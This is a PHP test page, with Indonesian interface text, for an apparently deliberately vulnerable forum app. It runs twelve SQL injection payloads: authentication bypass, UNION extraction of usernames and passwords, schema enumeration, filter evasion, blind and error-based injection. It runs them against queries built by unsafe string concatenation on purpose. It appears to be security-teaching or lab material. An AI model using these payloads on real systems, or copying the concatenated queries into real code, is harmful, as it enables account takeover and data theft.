<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';

// Inisialisasi hasil testing
$results = [];
$test_number = 1;

// Function untuk test SQL Injection
function testSQLInjection($description, $target, $payload, $method = 'POST', $additional_params = [])
{
    global $results, $test_number;

    $result = [
        'test_id' => $test_number++,
        'description' => $description,
        'target' => $target,
        'payload' => $payload,
        'method' => $method,
        'status' => 'UNKNOWN',
        'details' => '',
        'response' => '',
        'vulnerability_confirmed' => false
    ];

    try {
        // Simulate the request
        if ($target === 'login') {
            $response = testLoginInjection($payload, $additional_params);
        } elseif ($target === 'search') {
            $response = testSearchInjection($payload);
        } elseif ($target === 'direct_query') {
            $response = testDirectQuery($payload);
        }

        $result['response'] = $response['output'];
        $result['status'] = $response['status'];
        $result['details'] = $response['details'];
        $result['vulnerability_confirmed'] = $response['vulnerable'];
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['details'] = $e->getMessage();
        $result['response'] = 'Exception occurred: ' . $e->getMessage();
    }

    $results[] = $result;
    return $result;
}

// Test Login SQL Injection
function testLoginInjection($username_payload, $params)
{
    global $pdo;
    $password = $params['password'] ?? 'anything';

    try {
        // Simulate the vulnerable authenticateUser function
        $username = $username_payload;
        $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

        $vulnerable = false;
        $output = '';
        $details = '';

        // Check if it's an injection pattern
        if (strpos($username, "'") !== false || strpos($username, "--") !== false || strpos($username, "OR") !== false) {
            $vulnerable = true;
            $details = "SQL Injection pattern detected in query: " . $query;
        }

        try {
            $stmt = $pdo->query($query);
            $user = $stmt->fetch();

            if ($user) {
                $output = "LOGIN SUCCESS: User found - " . $user['username'] . " (Role: " . $user['role'] . ")";
                $vulnerable = true;
            } else {
                $output = "LOGIN FAILED: No user found";
            }
        } catch (PDOException $e) {
            $output = "SQL ERROR: " . $e->getMessage();
            $details = "Error indicates SQL injection attempt was processed";
            $vulnerable = true; // Error disclosure is also a vulnerability
        }

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Function execution error',
            'vulnerable' => false
        ];
    }
}

// Test Search SQL Injection
function testSearchInjection($search_payload)
{
    global $pdo;

    try {
        // Simulate vulnerable searchPosts function
        $keyword = addslashes($search_payload); // Basic escaping like in the original

        $query = "SELECT p.*, u.username, c.name as category_name
                  FROM posts p 
                  JOIN users u ON p.user_id = u.id 
                  JOIN categories c ON p.category_id = c.id 
                  WHERE (p.title LIKE '%$keyword%' OR p.content LIKE '%$keyword%') 
                  AND p.status = 'published'
                  ORDER BY p.created_at DESC";

        $vulnerable = false;
        $output = '';
        $details = '';

        // Check for UNION injection patterns
        if (stripos($search_payload, 'UNION') !== false || stripos($search_payload, 'SELECT') !== false) {
            $vulnerable = true;
            $details = "UNION SQL Injection pattern detected";
        }

        try {
            $stmt = $pdo->query($query);
            $results = $stmt->fetchAll();

            $output = "Search executed successfully. Found " . count($results) . " results.";

            // Check if results contain suspicious data (indicating UNION injection worked)
            foreach ($results as $result) {
                if (isset($result['title']) && (strpos($result['title'], 'information_schema') !== false ||
                    strpos($result['title'], 'database(') !== false ||
                    strpos($result['title'], 'user(') !== false)) {
                    $vulnerable = true;
                    $output .= " [INJECTION SUCCESS: Database info extracted]";
                    break;
                }
            }
        } catch (PDOException $e) {
            $output = "SQL ERROR: " . $e->getMessage();
            $details = "SQL syntax error indicates injection attempt";
            $vulnerable = true;
        }

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Search function error',
            'vulnerable' => false
        ];
    }
}

// Test direct database queries
function testDirectQuery($injection_payload)
{
    global $pdo;

    try {
        // Simulate direct vulnerable query
        $query = "SELECT * FROM users WHERE id = " . $injection_payload;

        $vulnerable = false;
        $output = '';
        $details = '';

        if (stripos($injection_payload, 'UNION') !== false || stripos($injection_payload, 'OR') !== false) {
            $vulnerable = true;
            $details = "SQL injection pattern in direct query";
        }

        try {
            $stmt = $pdo->query($query);
            $results = $stmt->fetchAll();

            $output = "Query executed. Retrieved " . count($results) . " records.";

            // If we got results from an injection, it's vulnerable
            if (count($results) > 0 && $vulnerable) {
                $output .= " [INJECTION SUCCESS]";
            }
        } catch (PDOException $e) {
            $output = "SQL ERROR: " . $e->getMessage();
            $vulnerable = true;
        }

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Direct query error',
            'vulnerable' => false
        ];
    }
}

// Mulai testing jika form disubmit
if ($_POST['run_tests'] ?? false) {

    // ===== BASIC SQL INJECTION TESTS =====
    echo "<h2>🔥 BASIC SQL INJECTION TESTS</h2>";

    // Test 1: Classic authentication bypass
    testSQLInjection(
        "Classic Auth Bypass - OR condition",
        "login",
        "admin' OR '1'='1' --",
        "POST",
        ['password' => 'anything']
    );

    // Test 2: Comment-based bypass
    testSQLInjection(
        "Comment-based Auth Bypass",
        "login",
        "admin'/**/OR/**/'1'='1'/**/--",
        "POST",
        ['password' => 'anything']
    );

    // Test 3: UNION-based information disclosure
    testSQLInjection(
        "UNION-based Database Info Extraction",
        "login",
        "admin' UNION SELECT user(), database(), version(), 'admin' --",
        "POST",
        ['password' => 'anything']
    );

    // ===== SEARCH-BASED SQL INJECTION =====
    echo "<h2>🔍 SEARCH-BASED SQL INJECTION</h2>";

    // Test 4: Search UNION injection
    testSQLInjection(
        "Search UNION - Extract User Data",
        "search",
        "' UNION SELECT username, password, email, role FROM users --"
    );

    // Test 5: Search information schema extraction
    testSQLInjection(
        "Search UNION - Database Structure",
        "search",
        "' UNION SELECT table_name, column_name, 'extracted', 'data' FROM information_schema.columns WHERE table_schema='forum_masyarakat' --"
    );

    // ===== ADVANCED EVASION TECHNIQUES =====
    echo "<h2>🥷 ADVANCED EVASION TECHNIQUES</h2>";

    // Test 6: Case variation evasion
    testSQLInjection(
        "Case Variation Evasion",
        "login",
        "admin' uNiOn SeLeCt user(), database(), version(), 'admin' --",
        "POST",
        ['password' => 'anything']
    );

    // Test 7: Comment injection evasion
    testSQLInjection(
        "Comment Injection Evasion",
        "search",
        "' UN/**/ION SE/**/LECT username, password, email, role FR/**/OM users --"
    );

    // Test 8: Function-based evasion
    testSQLInjection(
        "Function-based Evasion",
        "search",
        "' UNION(SELECT(username),(password),(email),(role)FROM(users)) --"
    );

    // ===== BLIND SQL INJECTION =====
    echo "<h2>🕵️ BLIND SQL INJECTION TESTS</h2>";

    // Test 9: Time-based blind injection
    testSQLInjection(
        "Time-based Blind Injection",
        "login",
        "admin' AND SLEEP(3) --",
        "POST",
        ['password' => 'anything']
    );

    // Test 10: Boolean-based blind injection
    testSQLInjection(
        "Boolean-based Blind Injection",
        "login",
        "admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --",
        "POST",
        ['password' => 'anything']
    );

    // ===== ERROR-BASED SQL INJECTION =====
    echo "<h2>⚠️ ERROR-BASED SQL INJECTION</h2>";

    // Test 11: Error-based information extraction
    testSQLInjection(
        "Error-based Info Extraction",
        "search",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e)) --"
    );

    // Test 12: Double query error-based
    testSQLInjection(
        "Double Query Error-based",
        "search",
        "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT((SELECT database()),FLOOR(RAND(0)*2))) --"
    );
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Comprehensive Testing</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .test-vulnerable {
            background-color: #f8d7da;
            border-left: 5px solid #dc3545;
        }

        .test-safe {
            background-color: #d1e7dd;
            border-left: 5px solid #198754;
        }

        .test-error {
            background-color: #fff3cd;
            border-left: 5px solid #ffc107;
        }

        .payload-code {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
        }

        .result-details {
            font-size: 0.9em;
            color: #666;
        }

        .vulnerability-badge {
            font-size: 0.8em;
        }
    </style>
</head>

<body>
    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-danger text-white">
                        <h2><i class="fas fa-database"></i> 🛡️ SQL INJECTION COMPREHENSIVE TESTING</h2>
                        <p class="mb-0">Testing semua teknik SQL Injection pada Forum Vulnerable</p>
                    </div>

                    <div class="card-body">
                        <?php if (!isset($_POST['run_tests'])): ?>
                            <!-- Form untuk memulai testing -->
                            <div class="alert alert-warning">
                                <h5><i class="fas fa-exclamation-triangle"></i> Peringatan Testing</h5>
                                <p>Testing ini akan menjalankan berbagai payload SQL Injection pada sistem forum. Pastikan:</p>
                                <ul>
                                    <li>Database dalam keadaan backup terbaru</li>
                                    <li>Testing dilakukan di environment yang aman</li>
                                    <li>Tidak ada data production yang terpengaruh</li>
                                </ul>
                            </div>

                            <div class="row">
                                <div class="col-md-6">
                                    <h5>Target Testing:</h5>
                                    <ul>
                                        <li><strong>Login Form</strong> - Authentication bypass</li>
                                        <li><strong>Search Function</strong> - UNION injection</li>
                                        <li><strong>Direct Queries</strong> - Parameter injection</li>
                                    </ul>
                                </div>
                                <div class="col-md-6">
                                    <h5>Teknik yang Ditest:</h5>
                                    <ul>
                                        <li>Classic OR-based bypass</li>
                                        <li>UNION-based data extraction</li>
                                        <li>Blind SQL injection</li>
                                        <li>Error-based injection</li>
                                        <li>Comment injection evasion</li>
                                        <li>Case variation evasion</li>
                                    </ul>
                                </div>
                            </div>

                            <form method="POST" class="mt-4">
                                <button type="submit" name="run_tests" value="1" class="btn btn-danger btn-lg">
                                    <i class="fas fa-rocket"></i> Mulai SQL Injection Testing
                                </button>
                            </form>

                        <?php else: ?>
                            <!-- Hasil Testing -->
                            <div class="alert alert-info mb-4">
                                <h5><i class="fas fa-info-circle"></i> Testing Selesai</h5>
                                <p>Total Tests: <strong><?php echo count($results); ?></strong> |
                                    Vulnerable: <strong><?php echo count(array_filter($results, function ($r) {
                                                            return $r['vulnerability_confirmed'];
                                                        })); ?></strong> |
                                    Safe: <strong><?php echo count(array_filter($results, function ($r) {
                                                        return !$r['vulnerability_confirmed'] && $r['status'] !== 'ERROR';
                                                    })); ?></strong> |
                                    Errors: <strong><?php echo count(array_filter($results, function ($r) {
                                                        return $r['status'] === 'ERROR';
                                                    })); ?></strong>
                                </p>
                            </div>

                            <!-- Detail hasil setiap test -->
                            <div class="row">
                                <?php foreach ($results as $result): ?>
                                    <div class="col-12 mb-3">
                                        <div class="card <?php
                                                            echo $result['vulnerability_confirmed'] ? 'test-vulnerable' : ($result['status'] === 'ERROR' ? 'test-error' : 'test-safe');
                                                            ?>">
                                            <div class="card-header">
                                                <div class="d-flex justify-content-between align-items-center">
                                                    <h6 class="mb-0">
                                                        <i class="fas fa-bug"></i>
                                                        Test #<?php echo $result['test_id']; ?>: <?php echo htmlspecialchars($result['description']); ?>
                                                    </h6>
                                                    <span class="badge vulnerability-badge <?php
                                                                                            echo $result['vulnerability_confirmed'] ? 'bg-danger' : ($result['status'] === 'ERROR' ? 'bg-warning text-dark' : 'bg-success');
                                                                                            ?>">
                                                        <?php
                                                        echo $result['vulnerability_confirmed'] ? 'VULNERABLE' : ($result['status'] === 'ERROR' ? 'ERROR' : 'SAFE');
                                                        ?>
                                                    </span>
                                                </div>
                                            </div>

                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="col-md-6">
                                                        <strong>Target:</strong> <?php echo htmlspecialchars($result['target']); ?><br>
                                                        <strong>Method:</strong> <?php echo htmlspecialchars($result['method']); ?><br>
                                                        <strong>Status:</strong> <span class="badge bg-secondary"><?php echo $result['status']; ?></span>
                                                    </div>
                                                    <div class="col-md-6">
                                                        <strong>Payload:</strong>
                                                        <div class="payload-code mt-1">
                                                            <?php echo htmlspecialchars($result['payload']); ?>
                                                        </div>
                                                    </div>
                                                </div>

                                                <hr>

                                                <div class="row">
                                                    <div class="col-12">
                                                        <strong>Response:</strong>
                                                        <div class="mt-2 p-2 bg-light border-start border-3">
                                                            <?php echo htmlspecialchars($result['response']); ?>
                                                        </div>

                                                        <?php if (!empty($result['details'])): ?>
                                                            <div class="result-details mt-2">
                                                                <strong>Technical Details:</strong> <?php echo htmlspecialchars($result['details']); ?>
                                                            </div>
                                                        <?php endif; ?>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            </div>

                            <!-- Summary dan rekomendasi -->
                            <div class="alert alert-dark mt-4">
                                <h5><i class="fas fa-shield-alt"></i> Ringkasan Keamanan</h5>

                                <?php
                                $vulnerable_count = count(array_filter($results, function ($r) {
                                    return $r['vulnerability_confirmed'];
                                }));
                                $total_tests = count($results);
                                ?>

                                <?php if ($vulnerable_count > 0): ?>
                                    <div class="alert alert-danger">
                                        <strong>⚠️ SISTEM RENTAN SQL INJECTION!</strong><br>
                                        <?php echo $vulnerable_count; ?> dari <?php echo $total_tests; ?> test menunjukkan kerentanan.
                                        <ul class="mt-2">
                                            <li>Authentication dapat di-bypass</li>
                                            <li>Data sensitif dapat diekstrak</li>
                                            <li>Database structure dapat diungkap</li>
                                            <li>Potensi data corruption atau deletion</li>
                                        </ul>
                                    </div>
                                <?php else: ?>
                                    <div class="alert alert-success">
                                        <strong>✅ SISTEM AMAN</strong><br>
                                        Tidak ditemukan kerentanan SQL Injection pada test yang dilakukan.
                                    </div>
                                <?php endif; ?>

                                <h6>Rekomendasi Perbaikan:</h6>
                                <ul>
                                    <li><strong>Prepared Statements:</strong> Gunakan parameterized queries</li>
                                    <li><strong>Input Validation:</strong> Validasi dan sanitasi semua input user</li>
                                    <li><strong>Least Privilege:</strong> Database user dengan permission minimal</li>
                                    <li><strong>Error Handling:</strong> Jangan expose database errors ke user</li>
                                    <li><strong>WAF:</strong> Implementasi Web Application Firewall</li>
                                </ul>
                            </div>

                            <div class="text-center mt-4">
                                <a href="test_sql_injection_comprehensive.php" class="btn btn-secondary">
                                    <i class="fas fa-redo"></i> Test Ulang
                                </a>
                                <a href="test_xss_comprehensive.php" class="btn btn-primary">
                                    <i class="fas fa-arrow-right"></i> Lanjut ke XSS Testing
                                </a>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>